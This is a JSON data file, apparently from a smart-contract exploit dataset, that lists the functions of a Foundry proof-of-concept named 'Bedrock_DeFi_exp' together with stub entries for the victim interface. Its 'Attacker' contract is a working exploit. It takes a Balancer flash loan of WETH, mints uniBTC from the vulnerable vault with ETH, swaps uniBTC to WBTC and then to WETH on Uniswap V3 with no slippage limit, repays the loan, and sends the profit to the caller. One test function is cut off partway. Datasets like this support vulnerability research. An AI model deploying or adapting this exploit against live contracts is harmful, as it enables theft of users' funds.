[
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_836_584 - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "testPoCMinimal",
    "original_code": "    function testPoCMinimal() public {\n        // Borrow 200 ether to the attacker\n        vm.deal(attacker, 200e18);\n\n        // The attacker mint 200 ETH to 200 uniBTC\n        vm.startPrank(attacker);\n        IFS(VulVault).mint{value: 200e18}();\n\n",
    "description": ""
  },
  {
    "contract/interface": "Bedrock_DeFi_exp",
    "source_type": "attacker_contract",
    "function_name": "testPoCReplicate",
    "original_code": "    function testPoCReplicate() public {\n        vm.startPrank(attacker);\n        attackerC = new Attacker();\n\n        attackerC.attack();\n\n        console.log(\"Final balance in WETH :\", IFS(weth).balanceOf(attacker));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() external {\n        txSender = msg.sender;\n\n        IFS(uniBTC).approve(uniV3Router, type(uint256).max);\n        IFS(WBTC).approve(uniV3Router, type(uint256).max);\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = weth;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 30_800_000_000_000_000_000;\n        IFS(balancerVault).flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        IFS(weth).withdraw(amounts[0]);\n        IFS(VulVault).mint{value: address(this).balance}();\n        uint256 bal_uniBTC = IFS(uniBTC).balanceOf(address(this));\n\n        IFS.ExactInputSingleParams memory input = IFS.ExactInputSingleParams(\n            uniBTC, // address tokenIn;\n            WBTC, // address tokenOut;\n            500, // uint24 fee;\n            address(this), // address recipient;\n            block.timestamp, // uint256 deadline;\n            bal_uniBTC, // uint256 amountIn;\n            0, // uint256 amountOutMinimum;\n            0 // uint160 sqrtPriceLimitX96;\n        );\n\n        IFS(uniV3Router).exactInputSingle(input);\n\n        uint256 balWBTC = IFS(WBTC).balanceOf(address(this));\n\n        input = IFS.ExactInputSingleParams(\n            WBTC, // address tokenIn;\n            weth, // address tokenOut;\n            500, // uint24 fee;\n            address(this), // address recipient;\n            block.timestamp, // uint256 deadline;\n            balWBTC, // uint256 amountIn;\n            0, // uint256 amountOutMinimum;\n            0 // uint160 sqrtPriceLimitX96;\n        );\n\n        IFS(uniV3Router).exactInputSingle(input);\n        IFS(weth).transfer(balancerVault, amounts[0]);\n\n        uint256 bal_weth = IFS(weth).balanceOf(address(this));\n        IFS(weth).transfer(txSender, bal_weth);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "exactInputSingle",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IFS",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]